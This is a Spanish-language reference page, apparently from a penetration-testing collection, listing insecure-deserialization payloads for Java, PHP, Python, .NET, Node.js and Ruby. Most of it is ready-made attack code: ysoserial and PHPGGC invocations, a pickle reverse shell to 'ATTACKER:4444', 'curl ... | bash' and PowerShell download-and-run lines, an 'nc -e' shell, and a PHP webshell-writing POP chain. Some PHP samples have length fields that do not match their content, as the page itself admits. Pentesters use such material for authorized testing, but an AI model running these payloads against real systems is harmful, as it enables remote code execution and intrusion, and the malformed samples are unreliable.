# 🔓 Payloads de deserialización

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Deserialization.tr.md) • [🇬🇷 Ελληνικά](Deserialization.el.md)

```
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## ☕ Deserialización Java

### Detección
```
# Bytes de identificación (magic bytes)
AC ED 00 05    # Objeto Java serializado (Base64: rO0AB)
H4sIAAAA       # Comprimido con GZip

# Ubicaciones habituales
- Cookies (codificadas en Base64)
- Campos ocultos de formularios
- ViewState
- Parámetros de API
- RMI (puerto 1099)
- JMX (puerto 9010)
```

### ysoserial - Generador de payloads
```bash
# Instalar
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package

# Generar un payload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER/shell.sh | bash"
java -jar ysoserial.jar CommonsCollections6 "ping -c 3 ATTACKER"

# Cadenas de gadgets habituales
CommonsCollections1-7
CommonsCollectionsBeanutils
Jdk7u21
Spring1
Hibernate1
Groovy1
```

### Payload de exfiltración DNS
```bash
# Generar un payload de conexión DNS de retorno
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64

# Detección basada en DNS
java -jar ysoserial.jar JRMPClient "ATTACKER:1099"
```

### Bibliotecas vulnerables habituales
```
commons-collections:3.1-4.0
commons-beanutils
spring-beans
hibernate
```

---

## 🐘 Deserialización PHP

> **Versiones y formato:** algunos objetos serializados del original tienen longitudes de clase o cadena que no coinciden con su contenido; son ejemplos ilustrativos y se conservan sin corregir. PHP 8 dejó de deserializar automáticamente los metadatos Phar al acceder al archivo; también cambió parte de las comparaciones débiles. Véase la [migración oficial a PHP 8](https://www.php.net/manual/en/migration80.incompatible.php). Las cadenas de gadgets dependen de bibliotecas y versiones concretas.

### Métodos mágicos
```php
__construct()    // Creación de objetos
__destruct()     // Destrucción de objetos
__wakeup()       // Deserialización
__sleep()        // Serialización
__toString()     // Conversión de objeto a cadena
__call()         // Método inaccesible
__get()          // Lectura de una propiedad inaccesible
__set()          // Escritura en una propiedad inaccesible
```

### Payload básico
```php
// Formato de un objeto serializado
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}

// Objeto con propiedades
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// Array
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

### Conversión implícita de tipos (type juggling)
```php
// Evasión mediante el booleano true
O:4:"User":1:{s:8:"password";b:1;}

// Comparación con el entero 0
O:4:"User":1:{s:8:"password";i:0;}

// Evasión mediante comparación con un array
O:4:"User":1:{s:8:"password";a:0:{}}
```

### Payloads de cadenas POP
```php
// Escritura arbitraria de archivos
O:8:"LogClass":1:{s:4:"file";s:11:"/tmp/shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// Ejecución de comandos mediante __destruct()
O:10:"SystemExec":1:{s:3:"cmd";s:2:"id";}
```

### PHPGGC - Cadenas de gadgets PHP
```bash
# Instalar
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Listar gadgets
./phpggc -l

# Generar un payload
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 exec "id"
./phpggc Monolog/RCE1 exec "whoami"
./phpggc Guzzle/RCE1 system "cat /etc/passwd"

# Codificar en Base64
./phpggc -b Laravel/RCE1 system "id"

# Codificar como URL
./phpggc -u Laravel/RCE1 system "id"

# Con wrapper PHAR
./phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

### Deserialización Phar
```php
// Los archivos Phar pueden activar la deserialización al acceder a ellos
phar://path/to/phar.phar/internal-file

// Métodos de acceso que activan phar://
file_get_contents("phar://...")
file_exists("phar://...")
include("phar://...")
fopen("phar://...")
```

---

## 🐍 Deserialización Python (Pickle)

### Payload básico
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())
```

### Payload de shell inversa
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### Detección
```
# Bytes de identificación (magic bytes)
80 04 95    # Protocolo 4 (Python 3)
80 03       # Protocolo 3
80 02       # Protocolo 2

# Patrones Base64 habituales
gASV        # Protocolo 4
gAN         # Protocolo 3
```

### Deserialización YAML (Python)
```yaml
# Carga insegura de PyYAML
!!python/object/apply:os.system ["id"]
!!python/object/new:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# Varios comandos
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - /bin/bash
  - -c
  - "curl http://ATTACKER/shell.sh | bash"
```

---

## 🔷 Deserialización .NET

### Detección
```
# ViewState
Parámetro __VIEWSTATE (Base64)

# BinaryFormatter
AAEAAAD/////    # Identificador en Base64

# JSON.NET
Campo $type en JSON
```

### ysoserial.net - Generador de payloads
```powershell
# Descargar
# https://github.com/pwntester/ysoserial.net

# Generar un payload
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# Gadgets habituales
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"

# Explotación de ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping ATTACKER" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

### JSON.NET TypeNameHandling
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd.exe", "/c calc.exe"]
    }
}
```

---

## 🟨 JavaScript/Node.js

### node-serialize
```javascript
// Código vulnerable: unserialize(user_input)
// Payload con IIFE (expresión de función invocada inmediatamente)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// Shell inversa
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh ATTACKER 4444')}()"}
```

### serialize-javascript
```javascript
// Si se utiliza eval() sobre datos deserializados
(function(){require('child_process').execSync('id')})()
```

---

## 🔴 Deserialización Ruby

### Marshal.load
```ruby
# Crear un payload
require 'base64'
code = "system('id')"
payload = "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements[\x06o:\x18Gem::Package::TarReader\x06:\x09@ioo:\x15Gem::Package::TarReader::Entry\x06:\x0A@headI\"\x00#{code}\x06:\x06ET"
puts Base64.encode64(payload)
```

### YAML.load (Psych)
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

## 📋 Lista de comprobación de pruebas

```markdown
□ Identificar el formato de serialización (Base64, hexadecimal y bytes de identificación)
□ Determinar el lenguaje o framework (Java, PHP, Python, .NET)
□ Encontrar versiones vulnerables de bibliotecas
□ Generar payloads con la herramienta adecuada
□ Probar a ciegas con conexiones DNS/HTTP de retorno
□ Probar la lectura y escritura de archivos
□ Probar la ejecución de código
□ Probar distintas cadenas de gadgets
□ Eludir filtros mediante codificación o compresión
```

---

## 🔗 Resumen de herramientas

| Lenguaje | Tool | Uso |
|----------|------|-------|
| **Java** | ysoserial | `java -jar ysoserial.jar GADGET "cmd"` |
| **PHP** | PHPGGC | `./phpggc GADGET system "cmd"` |
| **Python** | Personalizado | `pickle.dumps(Exploit())` |
| **.NET** | ysoserial.net | `ysoserial.exe -g GADGET -f FORMAT -c "cmd"` |
| **Ruby** | Personalizado | Creación manual de payloads |

---

## 🔗 Payloads relacionados

- [Payloads SSTI](./SSTI.es.md)
- [Inyección de comandos](./Command-Injection.es.md)

---

**Volver a los payloads:** [💉 Colección de payloads](../../README.md#-payloads-collection)
